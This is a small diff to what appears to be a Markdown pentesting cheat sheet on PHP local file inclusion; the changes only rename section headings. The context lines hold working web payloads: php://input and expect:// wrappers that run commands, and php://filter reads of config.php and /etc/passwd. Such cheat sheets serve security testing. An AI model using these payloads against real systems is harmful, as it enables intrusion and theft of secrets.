@@ -245,6 +245,8 @@ Common Obstacles:
 POST ?page=php://input&cmd=whoami
 ```
 
+####  PHP wrappers:
+
 PHP Filter; Useful trick for reading php pages when security is high:
 ```
 ?page=php://filter/convert.base64-encode/pg=../config.php
@@ -252,7 +254,8 @@ PHP Filter; Useful trick for reading php pages when security is high:
 ?page=php://filter/convert.base64-encode/resource=/etc/passwd
 ```
 
-#### Other PHP wrappers:
+More PHP Wrappers:
+
 **Expect** allows for immediate RCE (uncommon) 
 ```?page=expect://whoami```
 
